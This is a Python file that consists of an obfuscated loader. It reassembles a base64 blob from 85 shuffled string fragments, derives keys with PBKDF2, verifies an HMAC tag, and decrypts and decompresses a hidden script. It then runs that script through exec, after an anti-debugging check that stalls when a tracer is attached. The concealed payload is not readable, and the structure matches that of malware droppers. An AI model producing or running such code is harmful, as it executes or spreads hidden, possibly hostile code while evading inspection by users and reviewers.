import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_f0be39_0 = 'aPuOCeUXwIBmukxTPNk7/QBEEv9IW+3eaW2YPrV3J0ee'
_f0be39_1 = 'gCtypG5TUKl/62wOG4SDp2'
_f0be39_2 = 'av2k2zm6VX/0Hz8TN38LFkrKV'
_f0be39_3 = 'KmRxqB3rhSicqQMpHmE70momHxbVotokx/'
_f0be39_4 = 'yzr7AEJJEB+QP4vnds+wzXNOzkhKM3P/da9l4amHvIVluyikhO36mw/k'
_f0be39_5 = 'Wexa8fk98XJPZ+lQ/0EQBK4HX7L88vrWKs/8adNEmu9GGx6G5S'
_f0be39_6 = 'jZjlclauoz994DgEgxo9j9w2/+FUMFkktNE0Rp6HjyDJ+Dyjp+hmzIK+8Zj0VAT4'
_f0be39_7 = 'KwrBRwMWuI5n9iEQXJ5GZQhOgSc2q2f53U'
_f0be39_8 = 'R44s94JSoNmIwAlNQBNmO4BuiHXKU+0cqiYgY6MWx3gnZ9tfVS6fQjsusD'
_f0be39_9 = 'q37DvdkPxKke/cjI+d8wS+eotxDYffWA9yScVBs2WghU'
_f0be39_10 = 'Bw2T8jtcEUL30XRsxupBGMMhGGg6'
_f0be39_11 = '3VCs/9ozKW57CMJtdmOecxt0+JnSiGQQqvKpB4'
_f0be39_12 = 'xU29LsaMRVs3euc5DIFPvS+fa3'
_f0be39_13 = 'oTdqpfSY/GadAZG+4hugqGe27sAO9SPxdPDliVB+R'
_f0be39_14 = '1RTOyaG89MchGgSMVvQRJUWY3MXOlSEBbcVEAmfFR62TZTd+7W8QWBaBJoHo'
_f0be39_15 = 'XyoStX8iGMdgaRVN1hqD8ne6/18A1TawA5D6QYdjM7f0PLB'
_f0be39_16 = 'hZTo4qtHI5thjMvdWHN6IXDVpWTrC'
_f0be39_17 = '9ppyPR3FjZmwIU9VaSHbbZrBLWQgrQ6jP78WSPm5Oa'
_f0be39_18 = 'smyZ+fDp7IH/EINqH0zN/GrvEMLsLtfF/Em2Hnh9TdQ2X2QFAguxPUdW'
_f0be39_19 = 'Jz3HFiGgT1LQMHAzPgXPUa+nOHMfx4nDoPmQvRImrTilZL9eLIvrdpm'
_f0be39_20 = 'Ip8yWhRjh0cx/6qbf1A9zS0J+tx9M53I6QmEwfYa2+T'
_f0be39_21 = 'qmafj10nF6MUn7ZJ4c8iIs1IUwWkKJIP7TYx8CN7oNmoJlVmuFznYJmIzXF'
_f0be39_22 = 'pQTnSQiT8FdLYZ+YsYWEcB4OeoKdhVJ63bCFn4Dqy/NERLONDilvXpluQPps'
_f0be39_23 = 'HjcJJlW3r6d6XuMpV+6uqIGXUR75'
_f0be39_24 = '4lJf26tke6kdzpicNBbBiXzn8KVRSziaep8'
_f0be39_25 = 'a0RCh7qM7V8l9S9gNQ6FY0dV7OHwh8u1WcziiXGqw'
_f0be39_26 = 'XX8iYtIkChIj6xGZZ1T+'
_f0be39_27 = 'TLzj64ndL/xFBwqaq90kzkIyK+PBorQC7Hvfn'
_f0be39_28 = 'I/ln3IYH4zBh6AHY8EJ5kEc66jdgaCasT2zfTK7OVJA5dcfI8T7SL'
_f0be39_29 = '21DRiPioQcEz3HIPXzoAY9dslp60CtIfL'
_f0be39_30 = '+Z0psbQGdGN0cfkmP59v4s3N+Id84kj6clz4E3VuEZlNEUoKGGFECF'
_f0be39_31 = 'Ew+oi/CQCP4QgGD6CtjaTWxDIbc+ne'
_f0be39_32 = 'ESBjZL4fyeGbWTngAOBKIO40mY4OhM'
_f0be39_33 = 'T8cADoXwjtcCTm/xbWo/7YfQPDNyDiuN9aofZC9Tq4ZNUJcoyrtCUm9gK'
_f0be39_34 = 'iuCuuyYWfen61nstWCpBZESJTjoz1mvYVxWr4vTND8CYZ3/U82qgQZL'
_f0be39_35 = 'wctKdXrS9TAZQ6ZNjavrVkNbN/4fuCx2zORjHh8Fqr'
_f0be39_36 = 'oWr1IfAJ0d/V7tV5A6i6D/MEt0fvHXjeIDIT/a'
_f0be39_37 = 'YmJ71yCQT1McHiZ7EsiHW'
_f0be39_38 = 'tAwRdvwFjaGiW3mcIeTx6LFso+QQZxbLR5Mrq92Avt73QMzBR'
_f0be39_39 = 'WBenCRKp7wXaI5ZD/mfuL2eZvl+UqCoEdUsuCpR2C1zIZoAl'
_f0be39_40 = 'E+uNX2aOjx5xMAuv/Lb3Eb+vQTHtdKU5gkUWB6CxSuQAE1YA'
_f0be39_41 = 'S9Dup7NxWT8lqF6kqvgAvRmNuxrtFm+Wuy8K0jGrCMd24dj5VgmktbAZ+Asb6bek'
_f0be39_42 = '+vb712mfbD8kKdHYa4lIco/mQW/ybcDosHkuqTHhOWj'
_f0be39_43 = '1s+UOBSxW907n2R0yavx'
_f0be39_44 = 'ZyDmj7mVVU/aSHavpAgGzOR4FFLhVZVL1v2rqHgn3'
_f0be39_45 = 'PH0D8+oMrRdWHlAOFMqQbSwWtZ'
_f0be39_46 = 'KLzZOs5FKNj2yzPEhkZdrZy65f8jO+Tf5+rTqlvxHYldFcGknGTqVGCEZjX+9HFt'
_f0be39_47 = 'vEu7jIht6GiFMHE9D7mrpx3mgidTrc'
_f0be39_48 = 'ThnwS+JEXQ1bHCOd7z3bIzPMDfuD8+k05BoOFi8yBlKX3pGzePZi/8G20781SR6Z'
_f0be39_49 = '/063VRk8Vpd2kAxzE840AD36vmgddDphVMY59Gv3EH34CF4kXwR7g1ryCH4LSsX'
_f0be39_50 = '2KjXcNztU/Unaugl4NZYlfm4iXlS/IAmVLXvSDTuRMKoN1'
_f0be39_51 = 'rU/A4fARRYN4EiyUoULgurRY3zg'
_f0be39_52 = 'j5HywLCNjSKEiW+lbIYChts4LsJCCWTa62ynflBRX7s8r'
_f0be39_53 = 'ShPXhFSn89zgR8AvNx0flJEYpDUI0GsmFHdjypON+4'
_f0be39_54 = '33NpuiQIv9jqSkHi2HDekEWZsT6/68Rf//pfnr9op/0Rt6qcEphTitjTy'
_f0be39_55 = 'pUabzJ5LqVeubooDRQbrsmuyzhHw8w'
_f0be39_56 = 'ARqUIU2lmZsOBMtkIBWY9JiEC1uRpE0AMcbuaS9w7pUbjuKTdNT4Byqg'
_f0be39_57 = 'ygNlWnBoHbSbdGFp4vydC3N7QnuK2AvXLQDG9QiynWF9okdq3O'
_f0be39_58 = '0KKCWl67zZHS3LaTwfF7cAc9vRAzo+5eZdtZrzZVVViRXdT40OX90GhWK'
_f0be39_59 = 'gssTXAvUo3qDk35/3SJhxxFTRXbAYH/'
_f0be39_60 = 'VZCaIUpSl+58xoAv2pijPnnJs6z7Yd4FpAWVl1xM9gZB1phZf/M5MwsEQ'
_f0be39_61 = 'kYwIWUsXpXbN0ESOlieO1ThDSgM45s'
_f0be39_62 = 'WRuknn/W21O6FdgRWsIVX/RhNxtigfyCmfIutMcoEZsS+CX5+FKgjnW'
_f0be39_63 = 'xdw40czM2eQvaDblKaW8'
_f0be39_64 = 'LVIVHkupQDu1o8Z3Ma7ZCPxV9SWdG6PNHiqHLpLPWvb1ZqafS3e3csgPxIK/TW'
_f0be39_65 = 'Zt3WJ6YrF6ihZKgLE+EXoY1xFXw/h3lTKWxDF'
_f0be39_66 = '4ebpVLEmna9eD+7HOi09bvcns3'
_f0be39_67 = 'RrTfoUhPNs7mfy49tjXuqQ/MXsVS+TH'
_f0be39_68 = 'cVq2IqLM+GqemXrjkCzaSwHd0/r'
_f0be39_69 = 'cF9wQusiEg6kYuO/v21yOhQXLkUQcFo4rN/h9TyWfRXwz'
_f0be39_70 = 'Odwo1EhS7tQEFBG5KZhInu5oDvgqcjT'
_f0be39_71 = 'SA8DTbhgSDDuRR/slVMeU0z1Fl8ZbbpCT5x+1'
_f0be39_72 = 'pOF3J+y1gec3tUWNhoumX'
_f0be39_73 = 'CnS9X25rpEM7b72TyL6SlEqug5dr7TY7qictKikaCUPKmAqXCkixvlQebhWC/Fa'
_f0be39_74 = 'VXbR2WFmqsleipT+wXSEQwQK7pC3aR4MH7+DDAqB9Q=='
_f0be39_75 = 'li/c/Ko83Ggbur45rqCEWVg7W4e'
_f0be39_76 = 'DhW15v+qvR+U4+3M8XwuMTTAy22kzYIDeGTLlyeowmarAhjF03'
_f0be39_77 = 'LMJiQmPu4Ug4Y/+Axv9SIkzuZL+PfZ0TGxI6xRYji7eCV4l4dXWOArLtMx7o'
_f0be39_78 = 'P5Zx1Lt4JlcfUOctS3VutnAIAeNI3FG4nlTHdzWjon'
_f0be39_79 = 'prI7xjkAA4uZrK2rWWr3rn'
_f0be39_80 = 'ybPs8pxI2kH1Dl/okxJdOpQcnrIzrlpRVN3Extef+C/jskVZ3RQl'
_f0be39_81 = '1RDQIZV7M0F44PE9eFyr3wAOnDs'
_f0be39_82 = 'G0ctUBbLie93Xa4QmodY8KmY+2NFm4R'
_f0be39_83 = '7mGMlr29usPF8pC8wEuwxoaA37tqWVrWVfBWq6BrE6N7Co8XSYBIYNHXHdCSwxH'
_f0be39_84 = 'pPbCq2sDdXdDax/aMrl5KeShwxRf/TGb23Ru084a6y'
_pls = [_f0be39_0, _f0be39_1, _f0be39_2, _f0be39_3, _f0be39_4, _f0be39_5, _f0be39_6, _f0be39_7, _f0be39_8, _f0be39_9, _f0be39_10, _f0be39_11, _f0be39_12, _f0be39_13, _f0be39_14, _f0be39_15, _f0be39_16, _f0be39_17, _f0be39_18, _f0be39_19, _f0be39_20, _f0be39_21, _f0be39_22, _f0be39_23, _f0be39_24, _f0be39_25, _f0be39_26, _f0be39_27, _f0be39_28, _f0be39_29, _f0be39_30, _f0be39_31, _f0be39_32, _f0be39_33, _f0be39_34, _f0be39_35, _f0be39_36, _f0be39_37, _f0be39_38, _f0be39_39, _f0be39_40, _f0be39_41, _f0be39_42, _f0be39_43, _f0be39_44, _f0be39_45, _f0be39_46, _f0be39_47, _f0be39_48, _f0be39_49, _f0be39_50, _f0be39_51, _f0be39_52, _f0be39_53, _f0be39_54, _f0be39_55, _f0be39_56, _f0be39_57, _f0be39_58, _f0be39_59, _f0be39_60, _f0be39_61, _f0be39_62, _f0be39_63, _f0be39_64, _f0be39_65, _f0be39_66, _f0be39_67, _f0be39_68, _f0be39_69, _f0be39_70, _f0be39_71, _f0be39_72, _f0be39_73, _f0be39_74, _f0be39_75, _f0be39_76, _f0be39_77, _f0be39_78, _f0be39_79, _f0be39_80, _f0be39_81, _f0be39_82, _f0be39_83, _f0be39_84]
_8e30d9 = [(48303,52952,2),(43446,49220,2),(45893,48022,2),(37101,9203,2),(46588,12033,2),(51014,49349,2),(52234,16085,2),(20700,15368,2),(40191,10614,2),(15499,44164,2),(11284,65294,2),(4280,5075,2),(16554,24132,2),(1397,2291,2),(50716,22773,2),(705,26918,2),(0,0,0),(0,0,0)]
_c964b2 = 'cndp8g=='
_e29fcc = 'TnFpNiuvG97BevAw'
_a260db = 'xUnLPKsEjDI='
_b6da1b = [67, 53, 26, 60, 4, 5, 68, 32, 29, 25, 78, 30, 64, 3, 62, 48, 39, 74, 7, 38, 82, 72, 16, 66, 2, 61, 79, 34, 28, 57, 81, 63, 18, 10, 51, 0, 50, 76, 80, 71, 1, 56, 27, 58, 22, 77, 73, 55, 36, 65, 44, 83, 17, 59, 12, 11, 52, 41, 19, 33, 54, 15, 13, 8, 20, 46, 47, 40, 37, 9, 21, 23, 42, 69, 84, 43, 35, 45, 24, 75, 70, 14, 31, 49, 6]
_salt = base64.b64decode(_a260db)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _b6da1b
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_bb4cdb = base64.b64decode(_assembled)
_f39116 = 32
_ad4056 = _bb4cdb[:-_f39116]
_f39116 = _bb4cdb[-_f39116:]
_fc7f1d = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_8e30d9)
_hdr = base64.b64decode(_c964b2)
_nonce = base64.b64decode(_e29fcc)
_km_seed = hashlib.sha256(_fc7f1d + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _ad4056, hashlib.sha256).digest()
if _calc_tag != _f39116:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_ad4056)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_ad4056, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_6d204f'] = mmap
globals()['_27d670'] = lambda i: globals()['_6d204f'][str(i)]
_x = globals()['_27d670']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
